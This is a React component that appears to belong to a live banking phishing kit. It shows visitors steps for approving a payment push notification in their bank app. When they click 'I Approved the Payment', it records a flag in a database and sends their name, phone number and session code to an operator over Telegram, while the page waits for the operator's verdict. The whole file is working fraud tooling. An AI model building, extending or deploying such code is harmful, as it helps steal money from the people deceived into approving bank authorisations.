import { useState, useEffect } from "react";
import { Button } from "@/components/ui/button";
import { Smartphone, Shield, Loader2, AlertTriangle, XCircle, Info, CheckCircle } from "lucide-react";
import { supabase } from "@/integrations/supabase/client";

interface AppApprovalProps {
  sessionCode: string;
  clientName: string | null;
  phoneNumber: string | null;
  adminMessage: string | null;
  messageType: string | null;
  onDismissMessage: () => void;
}

const AppApproval = ({ 
  sessionCode, 
  clientName, 
  phoneNumber,
  adminMessage,
  messageType,
  onDismissMessage
}: AppApprovalProps) => {
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [isSubmitted, setIsSubmitted] = useState(false);

  // Reset form when admin sends an error message (not approved)
  useEffect(() => {
    if (adminMessage && messageType === "error" && isSubmitted) {
      setIsSubmitted(false);
    }
  }, [adminMessage, messageType, isSubmitted]);

  const sendApprovalToTelegram = async () => {
    try {
      const message = `📱 <b>Client Claims Payment Approved</b>

📋 <b>Session:</b> #${sessionCode}
👤 <b>Client:</b> ${clientName || "Unknown"}
📱 <b>Phone:</b> ${phoneNumber || "N/A"}

✅ <b>Status:</b> Client clicked "I Approved Payment"

⚠️ Please verify the payment was actually approved, then click "Confirm Payment" or "Not Approved" in admin panel.

⏰ <b>Time:</b> ${new Date().toLocaleString()}`;

      await supabase.functions.invoke("send-telegram", {
        body: { message },
      });
    } catch (error) {
      console.error("Failed to send Telegram notification:", error);
    }
  };

  const handleApprovalClick = async () => {
    setIsSubmitting(true);
    
    // Clear any previous admin message
    onDismissMessage();

    // Save to database that client claims approved
    const sessionId = localStorage.getItem("swift_session_id");
    if (sessionId) {
      await supabase
        .from("client_sessions")
        .update({ verification_code: "APP_APPROVED_CLAIMED" })
        .eq("id", sessionId);
    }
    
    // Send notification to Telegram
    await sendApprovalToTelegram();
    
    setIsSubmitting(false);
    setIsSubmitted(true);
  };

  const getAlertIcon = () => {
    switch (messageType) {
      case "error": return <XCircle className="w-5 h-5" />;
      case "warning": return <AlertTriangle className="w-5 h-5" />;
      default: return <Info className="w-5 h-5" />;
    }
  };

  const getAlertStyles = () => {
    switch (messageType) {
      case "error": return "bg-destructive/10 border-destructive/30 text-destructive";
      case "warning": return "bg-yellow-500/10 border-yellow-500/30 text-yellow-600";
      default: return "bg-blue-500/10 border-blue-500/30 text-blue-600";
    }
  };

  if (isSubmitted) {
    return (
      <div className="animate-slide-up">
        <div className="card-elevated p-8 max-w-lg mx-auto">
          <div className="text-center mb-8">
            <div className="flex items-center justify-center mb-4">
              <div className="w-16 h-16 rounded-full bg-primary/10 flex items-center justify-center">
                <Loader2 className="w-8 h-8 text-primary animate-spin" />
              </div>
            </div>
            <h2 className="text-2xl font-display font-bold mb-2">
              Verifying Approval
            </h2>
            <p className="text-muted-foreground">
              Please wait while we verify your payment approval. This may take a moment...
            </p>
          </div>

          <div className="bg-secondary/50 rounded-xl p-4 mb-6">
            <div className="flex items-center gap-2 mb-2">
              <Shield className="w-4 h-4 text-primary" />
              <span className="text-sm font-medium">Processing</span>
            </div>
            <p className="text-sm text-muted-foreground">
              We're confirming your bank app approval. Please do not close this page.
            </p>
          </div>

          <div className="flex items-center justify-center gap-2 text-muted-foreground">
            <Loader2 className="w-4 h-4 animate-spin" />
            <span className="text-sm">Waiting for confirmation...</span>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="animate-slide-up">
      <div className="card-elevated p-8 max-w-lg mx-auto">
        <div className="text-center mb-8">
          <div className="flex items-center justify-center mb-4">
            <div className="w-16 h-16 rounded-full bg-blue-500/10 flex items-center justify-center">
              <Smartphone className="w-8 h-8 text-blue-500" />
            </div>
          </div>
          <h2 className="text-2xl font-display font-bold mb-2">
            Approve in Bank App
          </h2>
          <p className="text-muted-foreground">
            Please open your banking app and approve the payment notification to complete your transaction.
          </p>
        </div>

        {/* Admin Alert Message */}
        {adminMessage && (
          <div className={`flex items-start gap-3 p-4 rounded-xl border mb-6 ${getAlertStyles()}`}>
            {getAlertIcon()}
            <div className="flex-1">
              <p className="text-sm font-medium">{adminMessage}</p>
            </div>
            <button onClick={onDismissMessage} className="opacity-70 hover:opacity-100">
              <XCircle className="w-4 h-4" />
            </button>
          </div>
        )}

        {/* Instructions */}
        <div className="bg-blue-500/10 rounded-xl p-4 mb-6 border border-blue-500/20">
          <div className="flex items-center gap-2 mb-3">
            <Smartphone className="w-4 h-4 text-blue-500" />
            <span className="text-sm font-medium text-blue-600">How to approve:</span>
          </div>
          <ol className="text-sm text-muted-foreground space-y-2 list-decimal list-inside">
            <li>Open your banking app on your phone</li>
            <li>Look for a push notification or pending approval</li>
            <li>Review the payment details</li>
            <li>Tap "Approve" or "Confirm" in your bank app</li>
            <li>Return here and click the button below</li>
          </ol>
        </div>

        <div className="space-y-4">
          <Button
            onClick={handleApprovalClick}
            disabled={isSubmitting}
            className="w-full h-14 bg-green-600 hover:bg-green-700 text-white rounded-xl text-lg gap-2"
          >
            {isSubmitting ? (
              <>
                <Loader2 className="w-5 h-5 animate-spin" />
                Submitting...
              </>
            ) : (
              <>
                <CheckCircle className="w-5 h-5" />
                I Approved the Payment
              </>
            )}
          </Button>
        </div>

        {/* Security note */}
        <div className="mt-6 text-center">
          <p className="text-xs text-muted-foreground">
            🔒 Only click the button above after you've approved the payment in your bank app
          </p>
        </div>
      </div>
    </div>
  );
};

export default AppApproval;
